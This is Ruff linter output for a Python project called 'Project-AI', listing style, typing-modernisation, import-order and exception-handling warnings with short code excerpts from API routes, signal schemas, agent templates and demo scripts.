F401 `temporalio` imported but unused; consider using `importlib.util.find_spec` to test for availability
  --> .antigravity\scripts\setup_antigravity.py:52:20
   |
50 |         # Check for required Python packages
51 |         try:
52 |             import temporalio
   |                    ^^^^^^^^^^
53 |
54 |             checks["temporal_installed"] = True
   |
help: Remove unused import: `temporalio`

F401 `openai` imported but unused; consider using `importlib.util.find_spec` to test for availability
  --> .antigravity\scripts\setup_antigravity.py:59:20
   |
58 |         try:
59 |             import openai
   |                    ^^^^^^
60 |
61 |             checks["openai_installed"] = True
   |
help: Remove unused import: `openai`

SIM102 Use a single `if` statement instead of nested `if` statements
  --> .antigravity\scripts\setup_antigravity.py:90:13
   |
89 |               # Validate project section
90 | /             if "project" in config:
91 | |                 if config["project"].get("name") != "Project-AI":
   | |_________________________________________________________________^
92 |                       issues.append("Project name mismatch - should be 'Project-AI'")
   |
help: Combine `if` statements using `and`

E402 Module level import not at top of file
  --> api\main.py:95:1
   |
93 | # ---- Lifespan (replaces deprecated @app.on_event) ----
94 |
95 | import contextlib
   | ^^^^^^^^^^^^^^^^^
   |

B904 Within an `except` clause, raise exceptions with `raise ... from err` or `raise ... from None` to distinguish them from errors in exception handling
   --> api\main.py:545:9
    |
543 |         }
544 |     except ValueError as e:
545 |         raise HTTPException(status_code=404, detail=str(e))
    |         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
546 |     except ImportError:
547 |         raise HTTPException(
    |

B904 Within an `except` clause, raise exceptions with `raise ... from err` or `raise ... from None` to distinguish them from errors in exception handling
   --> api\main.py:547:9
    |
545 |           raise HTTPException(status_code=404, detail=str(e))
546 |       except ImportError:
547 | /         raise HTTPException(
548 | |             status_code=500, detail="Explainability Agent not available"
549 | |         )
    | |_________^
    |

B904 Within an `except` clause, raise exceptions with `raise ... from err` or `raise ... from None` to distinguish them from errors in exception handling
   --> api\main.py:574:9
    |
572 |           }
573 |       except ImportError:
574 | /         raise HTTPException(
575 | |             status_code=500, detail="Explainability Agent not available"
576 | |         )
    | |_________^
    |

B904 Within an `except` clause, raise exceptions with `raise ... from err` or `raise ... from None` to distinguish them from errors in exception handling
   --> api\request_validator.py:154:13
    |
152 |             pass
153 |         except UnicodeDecodeError:
154 |             raise RequestValidationError("Invalid encoding")
    |             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
155 |
156 |         return True
    |

B904 Within an `except` clause, raise exceptions with `raise ... from err` or `raise ... from None` to distinguish them from errors in exception handling
  --> api\save_points_routes.py:30:9
   |
28 |         return {"success": True, "save_point": result}
29 |     except Exception as e:
30 |         raise HTTPException(status_code=500, detail=str(e))
   |         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
   |

B904 Within an `except` clause, raise exceptions with `raise ... from err` or `raise ... from None` to distinguish them from errors in exception handling
  --> api\save_points_routes.py:39:9
   |
37 |         return save_manager.list_save_points()
38 |     except Exception as e:
39 |         raise HTTPException(status_code=500, detail=str(e))
   |         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
   |

B904 Within an `except` clause, raise exceptions with `raise ... from err` or `raise ... from None` to distinguish them from errors in exception handling
  --> api\save_points_routes.py:53:9
   |
51 |         raise
52 |     except Exception as e:
53 |         raise HTTPException(status_code=500, detail=str(e))
   |         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
   |

B904 Within an `except` clause, raise exceptions with `raise ... from err` or `raise ... from None` to distinguish them from errors in exception handling
  --> api\save_points_routes.py:67:9
   |
65 |         return {"success": True, "message": f"Deleted save point: {save_id}"}
66 |     except Exception as e:
67 |         raise HTTPException(status_code=500, detail=str(e))
   |         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
   |

B904 Within an `except` clause, raise exceptions with `raise ... from err` or `raise ... from None` to distinguish them from errors in exception handling
  --> api\save_points_routes.py:77:9
   |
75 |         return auto_service.get_stats()
76 |     except Exception as e:
77 |         raise HTTPException(status_code=500, detail=str(e))
   |         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
   |

UP035 `typing.Dict` is deprecated, use `dict` instead
 --> api\vr_routes.py:2:1
  |
1 | import time
2 | from typing import Any, Dict, List
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
3 |
4 | from fastapi import APIRouter, HTTPException
  |

UP035 `typing.List` is deprecated, use `list` instead
 --> api\vr_routes.py:2:1
  |
1 | import time
2 | from typing import Any, Dict, List
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
3 |
4 | from fastapi import APIRouter, HTTPException
  |

F401 [*] `fastapi.HTTPException` imported but unused
 --> api\vr_routes.py:4:32
  |
2 | from typing import Any, Dict, List
3 |
4 | from fastapi import APIRouter, HTTPException
  |                                ^^^^^^^^^^^^^
5 | from pydantic import BaseModel
  |
help: Remove unused import: `fastapi.HTTPException`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> api\vr_routes.py:12:13
   |
10 | class VRCommand(BaseModel):
11 |     type: str
12 |     params: Dict[str, Any]
   |             ^^^^
13 |     timestamp: float = time.time()
   |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
  --> api\vr_routes.py:18:16
   |
16 | # Simple in-memory queue for demo purposes
17 | # In production, use Redis or similar
18 | command_queue: List[VRCommand] = []
   |                ^^^^
   |
help: Replace with `list`

UP035 [*] Import from `collections.abc` instead: `Callable`
  --> benchmarks\psia_benchmark.py:39:1
   |
37 | from dataclasses import dataclass, field
38 | from datetime import datetime, timezone
39 | from typing import Any, Callable
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
40 |
41 | logger = logging.getLogger(__name__)
   |
help: Import from `collections.abc`

UP017 [*] Use `datetime.UTC` alias
  --> benchmarks\psia_benchmark.py:75:36
   |
73 |             os_version=platform.version(),
74 |             python_version=platform.python_version(),
75 |             timestamp=datetime.now(timezone.utc).isoformat(),
   |                                    ^^^^^^^^^^^^
76 |         )
   |
help: Convert to `datetime.UTC` alias

UP017 [*] Use `datetime.UTC` alias
   --> benchmarks\psia_benchmark.py:326:42
    |
324 |         report = {
325 |             "report_version": "1.0",
326 |             "generated_at": datetime.now(timezone.utc).isoformat(),
    |                                          ^^^^^^^^^^^^
327 |             "hardware": {
328 |                 "cpu_model": self._hardware.cpu_model,
    |
help: Convert to `datetime.UTC` alias

UP017 [*] Use `datetime.UTC` alias
  --> benchmarks\run_benchmarks.py:60:35
   |
58 |         "python_version": platform.python_version(),
59 |         "cpu_count": os.cpu_count(),
60 |         "timestamp": datetime.now(timezone.utc).isoformat(),
   |                                   ^^^^^^^^^^^^
61 |     }
   |
help: Convert to `datetime.UTC` alias

E402 Module level import not at top of file
  --> canonical\sovereign_proof.py:14:1
   |
12 | sys.path.insert(0, str(PROJECT_ROOT))
13 |
14 | from canonical.invariants import print_invariant_report, validate_invariants
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
15 | from project_ai.utils.tscg import TSCGEncoder
   |

E402 Module level import not at top of file
  --> canonical\sovereign_proof.py:15:1
   |
14 | from canonical.invariants import print_invariant_report, validate_invariants
15 | from project_ai.utils.tscg import TSCGEncoder
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
   |

F401 [*] `canonical.invariants.IdentityContinuityInvariant` imported but unused
  --> canonical\sovereign_proof.py:89:38
   |
88 |     # 2. Validate against Invariants
89 |     from canonical.invariants import IdentityContinuityInvariant
   |                                      ^^^^^^^^^^^^^^^^^^^^^^^^^^^
90 |
91 |     # Run validation
   |
help: Remove unused import: `canonical.invariants.IdentityContinuityInvariant`

N818 Exception name `LiaraViolation` should be named with an Error suffix
  --> cognition\liara_guard.py:9:7
   |
 9 | class LiaraViolation(Exception):
   |       ^^^^^^^^^^^^^^
10 |     pass
   |

UP035 `typing.Dict` is deprecated, use `dict` instead
  --> config\schemas\signal.py:23:1
   |
21 | from datetime import datetime
22 | from enum import Enum
23 | from typing import Any, Dict, List, Optional, Union
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
24 |
25 | from pydantic import BaseModel, Field, field_validator, model_validator
   |

UP035 `typing.List` is deprecated, use `list` instead
  --> config\schemas\signal.py:23:1
   |
21 | from datetime import datetime
22 | from enum import Enum
23 | from typing import Any, Dict, List, Optional, Union
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
24 |
25 | from pydantic import BaseModel, Field, field_validator, model_validator
   |

UP042 Class SignalPriority inherits from both `str` and `enum.Enum`
  --> config\schemas\signal.py:53:7
   |
53 | class SignalPriority(str, Enum):
   |       ^^^^^^^^^^^^^^
54 |     """Signal priority levels."""
   |
help: Inherit from `enum.StrEnum`

UP042 Class SignalType inherits from both `str` and `enum.Enum`
  --> config\schemas\signal.py:63:7
   |
63 | class SignalType(str, Enum):
   |       ^^^^^^^^^^
64 |     """Signal type classifications."""
   |
help: Inherit from `enum.StrEnum`

UP042 Class MediaType inherits from both `str` and `enum.Enum`
  --> config\schemas\signal.py:76:7
   |
76 | class MediaType(str, Enum):
   |       ^^^^^^^^^
77 |     """Media types for signal content."""
   |
help: Inherit from `enum.StrEnum`

UP006 [*] Use `list` instead of `List` for type annotation
  --> config\schemas\signal.py:91:13
   |
90 |     is_valid: bool
91 |     errors: List[str] = Field(default_factory=list)
   |             ^^^^
92 |     warnings: List[str] = Field(default_factory=list)
93 |     blocked_phrases: List[str] = Field(default_factory=list)
   |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
  --> config\schemas\signal.py:92:15
   |
90 |     is_valid: bool
91 |     errors: List[str] = Field(default_factory=list)
92 |     warnings: List[str] = Field(default_factory=list)
   |               ^^^^
93 |     blocked_phrases: List[str] = Field(default_factory=list)
94 |     pii_detected: List[str] = Field(default_factory=list)
   |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
  --> config\schemas\signal.py:93:22
   |
91 |     errors: List[str] = Field(default_factory=list)
92 |     warnings: List[str] = Field(default_factory=list)
93 |     blocked_phrases: List[str] = Field(default_factory=list)
   |                      ^^^^
94 |     pii_detected: List[str] = Field(default_factory=list)
   |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
  --> config\schemas\signal.py:94:19
   |
92 |     warnings: List[str] = Field(default_factory=list)
93 |     blocked_phrases: List[str] = Field(default_factory=list)
94 |     pii_detected: List[str] = Field(default_factory=list)
   |                   ^^^^
   |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
  --> config\schemas\signal.py:97:65
   |
97 | def fuzzy_match_forbidden(text: str, threshold: float = 0.8) -> List[str]:
   |                                                                 ^^^^
98 |     """
99 |     Check for forbidden phrases using fuzzy matching.
   |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> config\schemas\signal.py:132:30
    |
132 | def detect_pii(text: str) -> List[str]:
    |                              ^^^^
133 |     """
134 |     Detect PII patterns in text.
    |
help: Replace with `list`

UP045 [*] Use `X | None` for type annotations
   --> config\schemas\signal.py:163:11
    |
161 |     )
162 |     source: str = Field(description="Signal source identifier")
163 |     text: Optional[str] = Field(default=None, description="Text content of signal")
    |           ^^^^^^^^^^^^^
164 |     summary: Optional[str] = Field(default=None, description="Brief summary")
165 |     metadata: Dict[str, Any] = Field(
    |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
   --> config\schemas\signal.py:164:14
    |
162 |     source: str = Field(description="Signal source identifier")
163 |     text: Optional[str] = Field(default=None, description="Text content of signal")
164 |     summary: Optional[str] = Field(default=None, description="Brief summary")
    |              ^^^^^^^^^^^^^
165 |     metadata: Dict[str, Any] = Field(
166 |         default_factory=dict, description="Additional metadata"
    |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> config\schemas\signal.py:165:15
    |
163 |     text: Optional[str] = Field(default=None, description="Text content of signal")
164 |     summary: Optional[str] = Field(default=None, description="Brief summary")
165 |     metadata: Dict[str, Any] = Field(
    |               ^^^^
166 |         default_factory=dict, description="Additional metadata"
167 |     )
    |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
   --> config\schemas\signal.py:171:47
    |
169 |     @field_validator("text", "summary")
170 |     @classmethod
171 |     def validate_no_forbidden_phrases(cls, v: Optional[str]) -> Optional[str]:
    |                                               ^^^^^^^^^^^^^
172 |         """Validate that text does not contain forbidden phrases."""
173 |         if v is None:
    |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
   --> config\schemas\signal.py:171:65
    |
169 |     @field_validator("text", "summary")
170 |     @classmethod
171 |     def validate_no_forbidden_phrases(cls, v: Optional[str]) -> Optional[str]:
    |                                                                 ^^^^^^^^^^^^^
172 |         """Validate that text does not contain forbidden phrases."""
173 |         if v is None:
    |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
   --> config\schemas\signal.py:188:33
    |
186 |     @field_validator("text", "summary")
187 |     @classmethod
188 |     def validate_no_pii(cls, v: Optional[str]) -> Optional[str]:
    |                                 ^^^^^^^^^^^^^
189 |         """Validate that text does not contain obvious PII."""
190 |         if v is None:
    |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
   --> config\schemas\signal.py:188:51
    |
186 |     @field_validator("text", "summary")
187 |     @classmethod
188 |     def validate_no_pii(cls, v: Optional[str]) -> Optional[str]:
    |                                                   ^^^^^^^^^^^^^
189 |         """Validate that text does not contain obvious PII."""
190 |         if v is None:
    |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
   --> config\schemas\signal.py:216:15
    |
214 |     priority: SignalPriority = Field(default=SignalPriority.CRITICAL)
215 |
216 |     location: Optional[str] = Field(default=None, description="Location of distress")
    |               ^^^^^^^^^^^^^
217 |     severity: int = Field(ge=1, le=10, default=5, description="Severity level 1-10")
218 |     requires_immediate_response: bool = Field(default=True)
    |
help: Convert to `X | None`

UP006 [*] Use `list` instead of `List` for type annotation
   --> config\schemas\signal.py:219:22
    |
217 |     severity: int = Field(ge=1, le=10, default=5, description="Severity level 1-10")
218 |     requires_immediate_response: bool = Field(default=True)
219 |     escalation_path: List[str] = Field(
    |                      ^^^^
220 |         default_factory=list, description="Escalation chain"
221 |     )
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> config\schemas\signal.py:239:23
    |
238 |     incident_type: str = Field(description="Type of incident")
239 |     affected_systems: List[str] = Field(default_factory=list)
    |                       ^^^^
240 |     anomaly_score: float = Field(
241 |         ge=0.0, le=1.0, default=0.5, description="Anomaly detection score"
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> config\schemas\signal.py:244:26
    |
242 |     )
243 |     is_confirmed: bool = Field(default=False)
244 |     remediation_actions: List[str] = Field(default_factory=list)
    |                          ^^^^
245 |
246 |     @field_validator("anomaly_score")
    |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
   --> config\schemas\signal.py:263:31
    |
261 |     threat_type: str = Field(description="Type of threat detected")
262 |     threat_level: int = Field(ge=1, le=5, default=3, description="Threat level 1-5")
263 |     indicators_of_compromise: List[str] = Field(default_factory=list)
    |                               ^^^^
264 |     attack_vector: Optional[str] = Field(default=None)
265 |     mitre_tactics: List[str] = Field(
    |
help: Replace with `list`

UP045 [*] Use `X | None` for type annotations
   --> config\schemas\signal.py:264:20
    |
262 |     threat_level: int = Field(ge=1, le=5, default=3, description="Threat level 1-5")
263 |     indicators_of_compromise: List[str] = Field(default_factory=list)
264 |     attack_vector: Optional[str] = Field(default=None)
    |                    ^^^^^^^^^^^^^
265 |     mitre_tactics: List[str] = Field(
266 |         default_factory=list, description="MITRE ATT&CK tactics"
    |
help: Convert to `X | None`

UP006 [*] Use `list` instead of `List` for type annotation
   --> config\schemas\signal.py:265:20
    |
263 |     indicators_of_compromise: List[str] = Field(default_factory=list)
264 |     attack_vector: Optional[str] = Field(default=None)
265 |     mitre_tactics: List[str] = Field(
    |                    ^^^^
266 |         default_factory=list, description="MITRE ATT&CK tactics"
267 |     )
    |
help: Replace with `list`

UP045 [*] Use `X | None` for type annotations
   --> config\schemas\signal.py:283:23
    |
281 |     media_type: MediaType = Field(description="Type of media")
282 |     asset_path: str = Field(description="Path to media asset")
283 |     duration_seconds: Optional[float] = Field(
    |                       ^^^^^^^^^^^^^^^
284 |         default=None, description="Duration for audio/video"
285 |     )
    |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
   --> config\schemas\signal.py:286:22
    |
284 |         default=None, description="Duration for audio/video"
285 |     )
286 |     file_size_bytes: Optional[int] = Field(default=None)
    |                      ^^^^^^^^^^^^^
287 |     checksum: Optional[str] = Field(default=None, description="File checksum (SHA-256)")
288 |     transcript: Optional[str] = Field(
    |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
   --> config\schemas\signal.py:287:15
    |
285 |     )
286 |     file_size_bytes: Optional[int] = Field(default=None)
287 |     checksum: Optional[str] = Field(default=None, description="File checksum (SHA-256)")
    |               ^^^^^^^^^^^^^
288 |     transcript: Optional[str] = Field(
289 |         default=None, description="Transcription of audio/video"
    |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
   --> config\schemas\signal.py:288:17
    |
286 |     file_size_bytes: Optional[int] = Field(default=None)
287 |     checksum: Optional[str] = Field(default=None, description="File checksum (SHA-256)")
288 |     transcript: Optional[str] = Field(
    |                 ^^^^^^^^^^^^^
289 |         default=None, description="Transcription of audio/video"
290 |     )
    |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
   --> config\schemas\signal.py:294:50
    |
292 |     @field_validator("transcript")
293 |     @classmethod
294 |     def validate_transcript_no_forbidden(cls, v: Optional[str]) -> Optional[str]:
    |                                                  ^^^^^^^^^^^^^
295 |         """Validate transcript does not contain forbidden phrases."""
296 |         if v is None:
    |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
   --> config\schemas\signal.py:294:68
    |
292 |     @field_validator("transcript")
293 |     @classmethod
294 |     def validate_transcript_no_forbidden(cls, v: Optional[str]) -> Optional[str]:
    |                                                                    ^^^^^^^^^^^^^
295 |         """Validate transcript does not contain forbidden phrases."""
296 |         if v is None:
    |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> config\schemas\signal.py:326:14
    |
324 |     component: str = Field(description="System component that generated event")
325 |     status: str = Field(default="info", description="Event status")
326 |     metrics: Dict[str, Any] = Field(default_factory=dict)
    |              ^^^^
    |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
   --> config\schemas\signal.py:337:13
    |
335 |     action: str = Field(description="Action being audited")
336 |     actor: str = Field(description="Entity performing action")
337 |     target: Optional[str] = Field(default=None, description="Target of action")
    |             ^^^^^^^^^^^^^
338 |     outcome: str = Field(default="success", description="Outcome of action")
339 |     compliance_tags: List[str] = Field(default_factory=list)
    |
help: Convert to `X | None`

UP006 [*] Use `list` instead of `List` for type annotation
   --> config\schemas\signal.py:339:22
    |
337 |     target: Optional[str] = Field(default=None, description="Target of action")
338 |     outcome: str = Field(default="success", description="Outcome of action")
339 |     compliance_tags: List[str] = Field(default_factory=list)
    |                      ^^^^
    |
help: Replace with `list`

UP045 [*] Use `X | None` for type annotations
   --> config\schemas\signal.py:349:16
    |
348 |     config_key: str = Field(description="Configuration key changed")
349 |     old_value: Optional[Any] = Field(default=None)
    |                ^^^^^^^^^^^^^
350 |     new_value: Any = Field(description="New configuration value")
351 |     change_reason: Optional[str] = Field(default=None)
    |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
   --> config\schemas\signal.py:351:20
    |
349 |     old_value: Optional[Any] = Field(default=None)
350 |     new_value: Any = Field(description="New configuration value")
351 |     change_reason: Optional[str] = Field(default=None)
    |                    ^^^^^^^^^^^^^
352 |     requires_restart: bool = Field(default=False)
    |
help: Convert to `X | None`

UP007 Use `X | Y` for type annotations
   --> config\schemas\signal.py:356:10
    |
355 |   # Union type for all signal types
356 |   Signal = Union[
    |  __________^
357 | |     DistressSignal,
358 | |     IncidentSignal,
359 | |     SecurityAlertSignal,
360 | |     MediaSignal,
361 | |     SystemEventSignal,
362 | |     AuditEventSignal,
363 | |     ConfigurationSignal,
364 | |     BaseSignal,
365 | | ]
    | |_^
    |
help: Convert to `X | Y`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> config\schemas\signal.py:368:34
    |
368 | def validate_signal(signal_data: Dict[str, Any]) -> ValidationResult:
    |                                  ^^^^
369 |     """
370 |     Validate signal data against schema.
    |
help: Replace with `dict`

F401 [*] `json` imported but unused
   --> config\schemas\signal.py:431:12
    |
429 | if __name__ == "__main__":
430 |     # Testing
431 |     import json
    |            ^^^^
432 |
433 |     # Test valid signal
    |
help: Remove unused import: `json`

F821 Undefined name `generation`
  --> data\cerberus\agent_templates\python_template.py:58:22
   |
56 |         human_lang="{{human_lang}}",
57 |         locked_section="{{locked_section}}",
58 |         generation={{generation}},
   |                      ^^^^^^^^^^
59 |     )
60 |     agent.monitor()
   |

F401 [*] `hashlib` imported but unused
  --> data\cerberus\agents\cerberus-0-72810c96.py:8:8
   |
 6 | # Locked Section: model_weights
 7 |
 8 | import hashlib
   |        ^^^^^^^
 9 | import sys
10 | import time
   |
help: Remove unused import: `hashlib`

F401 [*] `sys` imported but unused
  --> data\cerberus\agents\cerberus-0-72810c96.py:9:8
   |
 8 | import hashlib
 9 | import sys
   |        ^^^
10 | import time
11 | from datetime import datetime
   |
help: Remove unused import: `sys`

F541 [*] f-string without any placeholders
  --> data\cerberus\agents\cerberus-0-72810c96.py:29:36
   |
27 |                 "en": {
28 |                     {
29 |                         "started": f"Agent {{self.agent_id}} started - Protecting {{self.locked_section}}",
   |                                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
30 |                         "monitoring": f"Monitoring section: {{self.locked_section}}",
31 |                         "breach_detected": f"BREACH DETECTED in {{self.locked_section}}!",
   |
help: Remove extraneous `f` prefix

F541 [*] f-string without any placeholders
  --> data\cerberus\agents\cerberus-0-72810c96.py:30:39
   |
28 |                     {
29 |                         "started": f"Agent {{self.agent_id}} started - Protecting {{self.locked_section}}",
30 |                         "monitoring": f"Monitoring section: {{self.locked_section}}",
   |                                       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
31 |                         "breach_detected": f"BREACH DETECTED in {{self.locked_section}}!",
32 |                         "spawning_reinforcements": f"Spawning 3 reinforcement agents...",
   |
help: Remove extraneous `f` prefix

F541 [*] f-string without any placeholders
  --> data\cerberus\agents\cerberus-0-72810c96.py:31:44
   |
29 |                         "started": f"Agent {{self.agent_id}} started - Protecting {{self.locked_section}}",
30 |                         "monitoring": f"Monitoring section: {{self.locked_section}}",
31 |                         "breach_detected": f"BREACH DETECTED in {{self.locked_section}}!",
   |                                            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
32 |                         "spawning_reinforcements": f"Spawning 3 reinforcement agents...",
33 |                     }
   |
help: Remove extraneous `f` prefix

F541 [*] f-string without any placeholders
  --> data\cerberus\agents\cerberus-0-72810c96.py:32:52
   |
30 |                         "monitoring": f"Monitoring section: {{self.locked_section}}",
31 |                         "breach_detected": f"BREACH DETECTED in {{self.locked_section}}!",
32 |                         "spawning_reinforcements": f"Spawning 3 reinforcement agents...",
   |                                                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
33 |                     }
34 |                 }
   |
help: Remove extraneous `f` prefix

F841 Local variable `msg` is assigned to but never used
  --> data\cerberus\agents\cerberus-0-72810c96.py:38:9
   |
36 |         }
37 |         # Additional language support would go here
38 |         msg = messages.get(self.human_lang, messages["en"]).get(
   |         ^^^
39 |             message_key, message_key
40 |         )
   |
help: Remove assignment to unused variable `msg`

F541 [*] f-string without any placeholders
  --> data\cerberus\agents\cerberus-0-72810c96.py:41:15
   |
39 |             message_key, message_key
40 |         )
41 |         print(f"[{{datetime.now().isoformat()}}] [{{self.agent_id}}] {{msg}}", **kwargs)
   |               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
42 |
43 |     def monitor(self):
   |
help: Remove extraneous `f` prefix

F821 Undefined name `ASCIIart`
  --> demos\kernel\presentation_demo.py:94:15
   |
93 |         self.header("PART 2: THE SOLUTION - Holographic Defense")
94 |         print(ASCIIart.layer_diagram())
   |               ^^^^^^^^
95 |         self.pause("Observe the 3-layer architecture...", 0)
   |

invalid-syntax: Cannot use type parameter lists on Python 3.11 (syntax was added in Python 3.12)
   --> demos\security_advantage\python\python_impossibility.py:119:19
    |
118 | # New Python 3.12 syntax for type parameters
119 | class SecretHolder[T]:
    |                   ^^^
120 |     """Attempt to use type parameters for secret protection."""
    |

invalid-syntax: Cannot use comments in f-strings on Python 3.11 (syntax was added in Python 3.12)
   --> demos\security_advantage\python\python_impossibility.py:179:5
    |
177 | # Attempt to hide in f-string expression
178 | protected_message = f"Secret: {
179 |     # Multi-line expression in f-string (Python 3.12)
    |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
180 |     get_secret_key()
181 | }"
    |

N806 Variable `SECRET_KEY` in function should be lowercase
   --> demos\security_advantage\python\python_impossibility.py:199:5
    |
197 | def get_production_key():
198 |     """Secret embedded in bytecode constants."""
199 |     SECRET_KEY = "sk-PRODUCTION-SECRET-12345"
    |     ^^^^^^^^^^
200 |     return SECRET_KEY
    |

E402 Module level import not at top of file
   --> demos\security_advantage\python\python_impossibility.py:337:1
    |
335 | secret12 = SecretWithInspect()
336 | # Can access via frame manipulation or other introspection
337 | import inspect
    | ^^^^^^^^^^^^^^
338 |
339 | frame_info = inspect.getframeinfo(inspect.currentframe())
    |

F541 [*] f-string without any placeholders
   --> demos\security_advantage\python\python_impossibility.py:340:7
    |
339 | frame_info = inspect.getframeinfo(inspect.currentframe())
340 | print(f"Γ£ù BYPASSED (inspect): Secrets visible via introspection")
    |       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
341 | print(f"  Frame info available: {frame_info.filename}")
342 | print("  Attack: inspect module exposes all runtime state")
    |
help: Remove extraneous `f` prefix

E722 Do not use bare `except`
   --> deploy\single-node-core\chaos\chaos_runner.py:546:13
    |
544 |                 self._cleanup_failure(experiment)
545 |                 experiment.status = ExperimentStatus.ROLLED_BACK
546 |             except:
    |             ^^^^^^
547 |                 pass
    |

F401 `cryptography.hazmat.primitives.hashes` imported but unused; consider using `importlib.util.find_spec` to test for availability
  --> deploy\single-node-core\security\crypto\sign_migration.py:26:48
   |
25 | try:
26 |     from cryptography.hazmat.primitives import hashes, serialization
   |                                                ^^^^^^
27 |     from cryptography.hazmat.primitives.asymmetric.ed25519 import (
28 |         Ed25519PrivateKey,
   |
help: Remove unused import: `cryptography.hazmat.primitives.hashes`

E722 Do not use bare `except`
   --> deploy\single-node-core\security\vault\vault_client.py:319:13
    |
317 |             try:
318 |                 existing = self.read_secret(vault_path, mount_point)
319 |             except:
    |             ^^^^^^
320 |                 existing = {}
    |

F401 [*] `shadow_thirst.static_analysis.DeterminismAnalyzer` imported but unused
  --> docs\shadow_thirst\STATIC_ANALYZERS_DEMO.py:28:5
   |
26 | from shadow_thirst.static_analysis import (
27 |     AnalysisSeverity,
28 |     DeterminismAnalyzer,
   |     ^^^^^^^^^^^^^^^^^^^
29 |     DivergenceRiskEstimator,
30 |     InvariantPurityChecker,
   |
help: Remove unused import

F401 [*] `shadow_thirst.static_analysis.DivergenceRiskEstimator` imported but unused
  --> docs\shadow_thirst\STATIC_ANALYZERS_DEMO.py:29:5
   |
27 |     AnalysisSeverity,
28 |     DeterminismAnalyzer,
29 |     DivergenceRiskEstimator,
   |     ^^^^^^^^^^^^^^^^^^^^^^^
30 |     InvariantPurityChecker,
31 |     PlaneIsolationAnalyzer,
   |
help: Remove unused import

F401 [*] `shadow_thirst.static_analysis.InvariantPurityChecker` imported but unused
  --> docs\shadow_thirst\STATIC_ANALYZERS_DEMO.py:30:5
   |
28 |     DeterminismAnalyzer,
29 |     DivergenceRiskEstimator,
30 |     InvariantPurityChecker,
   |     ^^^^^^^^^^^^^^^^^^^^^^
31 |     PlaneIsolationAnalyzer,
32 |     PrivilegeEscalationAnalyzer,
   |
help: Remove unused import

F401 [*] `shadow_thirst.static_analysis.PlaneIsolationAnalyzer` imported but unused
  --> docs\shadow_thirst\STATIC_ANALYZERS_DEMO.py:31:5
   |
29 |     DivergenceRiskEstimator,
30 |     InvariantPurityChecker,
31 |     PlaneIsolationAnalyzer,
   |     ^^^^^^^^^^^^^^^^^^^^^^
32 |     PrivilegeEscalationAnalyzer,
33 |     ResourceEstimator,
   |
help: Remove unused import

F401 [*] `shadow_thirst.static_analysis.PrivilegeEscalationAnalyzer` imported but unused
  --> docs\shadow_thirst\STATIC_ANALYZERS_DEMO.py:32:5
   |
30 |     InvariantPurityChecker,
31 |     PlaneIsolationAnalyzer,
32 |     PrivilegeEscalationAnalyzer,
   |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^
33 |     ResourceEstimator,
34 |     StaticAnalyzer,
   |
help: Remove unused import

